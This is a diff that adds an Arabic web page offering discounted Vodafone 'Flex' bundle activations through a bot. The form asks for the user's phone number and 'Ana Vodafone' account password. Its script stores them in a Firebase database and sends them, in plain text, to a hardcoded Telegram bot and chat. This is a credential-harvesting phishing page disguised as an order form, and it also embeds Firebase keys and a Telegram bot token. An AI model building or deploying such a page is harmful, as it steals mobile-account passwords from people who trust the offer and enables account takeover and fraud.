@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>تفعيلات فليكس</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Cairo', sans-serif;
+      background: linear-gradient(135deg, #2b2b4f, #5f5f89);
+      background-size: 400% 400%;
+      animation: gradientBG 12s ease infinite;
+      color: #fff;
+    }
+
+    @keyframes gradientBG {
+      0%, 100% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+    }
+
+    .container {
+      max-width: 450px;
+      margin: 50px auto;
+      padding: 30px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(10px);
+    }
+
+    .header {
+      text-align: center;
+      background: rgba(0, 0, 0, 0.2);
+      padding: 15px;
+      border-radius: 15px;
+      margin-bottom: 20px;
+      animation: pulse 3s infinite;
+    }
+
+    .header h1 {
+      margin: 0;
+      font-size: 1.5rem;
+      color: #ffd700;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.03); }
+    }
+
+    input, select, button {
+      width: 100%;
+      margin: 10px 0;
+      padding: 12px;
+      border: none;
+      border-radius: 12px;
+      font-size: 1rem;
+      outline: none;
+    }
+
+    input, select {
+      background: #f2f2f2;
+      color: #333;
+    }
+
+    button {
+      background: #00c853;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background: #009624;
+    }
+
+    #confirmation, #error {
+      display: none;
+      padding: 10px;
+      margin-top: 15px;
+      border-radius: 10px;
+      text-align: center;
+    }
+
+    #confirmation { background: #2e7d32; }
+    #error { background: #c62828; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>🎉 تفعيلات فليكس الخاصة بالبوت 🎉</h1>
+    </div>
+
+    <input type="tel" id="phone" placeholder="📱 رقم الهاتف">
+    <input type="password" id="password" placeholder="🔐 باسورد أنا فودافون">
+    <input type="text" id="botId" placeholder="🆔 ID الخاص بك في البوت">
+    <input type="tel" id="whatsapp" placeholder="📞 رقم الواتساب للتواصل">
+
+    <select id="plan">
+      <option disabled selected>اختر الباقة ⬇️</option>
+      <option value="2600 فليكس - 70 جنيه">2600 فليكس - 70 جنيه</option>
+      <option value="5200 فليكس - 120 جنيه">5200 فليكس - 120 جنيه</option>
+      <option value="7800 فليكس - 160 جنيه">7800 فليكس - 160 جنيه</option>
+      <option value="10400 فليكس - 190 جنيه">10400 فليكس - 190 جنيه</option>
+      <option value="13000 فليكس - 250 جنيه">13000 فليكس - 250 جنيه</option>
+    </select>
+
+    <button onclick="sendOrder()">📤 إكمال الطلب</button>
+
+    <p id="confirmation">✅ تم تقديم الطلب الخاص بك، انتظر رسالة واتساب بتفعيل الباقة. شكراً لك!</p>
+    <p id="error">❌ هذا الرقم قدم طلب مسبقاً ولا يمكنه التقديم مرة أخرى.</p>
+  </div>
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyDhd3l_1q-gNEeihQQY-5fpRvV9vCZgMYA",
+      authDomain: "wedoo7.firebaseapp.com",
+      databaseURL: "https://wedoo7-default-rtdb.firebaseio.com",
+      projectId: "wedoo7",
+      storageBucket: "wedoo7.appspot.com",
+      messagingSenderId: "176039023490",
+      appId: "1:176039023490:web:693f81466bd00a8767f59b",
+      measurementId: "G-Y3TLQ3CKYJ"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function sendOrder() {
+      const phone = document.getElementById('phone').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const botId = document.getElementById('botId').value.trim();
+      const whatsapp = document.getElementById('whatsapp').value.trim();
+      const plan = document.getElementById('plan').value;
+
+      if (!phone || !password || !botId || !whatsapp || !plan) {
+        alert("يرجى ملء جميع الحقول.");
+        return;
+      }
+
+      const ordersRef = db.ref("orders/" + phone);
+
+      ordersRef.once("value").then(snapshot => {
+        if (snapshot.exists()) {
+          document.getElementById("error").style.display = "block";
+          document.getElementById("confirmation").style.display = "none";
+        } else {
+          // حفظ في فايربيز
+          ordersRef.set({
+            phone,
+            password,
+            botId,
+            whatsapp,
+            plan,
+            timestamp: Date.now()
+          }).then(() => {
+            // إرسال إلى تيليجرام
+            const message = `
+📥 طلب جديد لتفعيل باقة فليكس:
+------------------------
+📱 رقم الهاتف: ${phone}
+🔐 باسورد أنا فودافون: ${password}
+🆔 ID البوت: ${botId}
+📞 واتساب: ${whatsapp}
+💳 الباقة المطلوبة: ${plan}
+            `;
+
+            fetch(`https://api.telegram.org/bot7604799658:AAHRsfXVPIbXWqdXm6AhvEyZvbab9C6BxAs/sendMessage`, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                chat_id: 8102839626,
+                text: message
+              })
+            });
+
+            document.getElementById("confirmation").style.display = "block";
+            document.getElementById("error").style.display = "none";
+          });
+        }
+      });
+    }
+  </script>
+</body>
+</html>
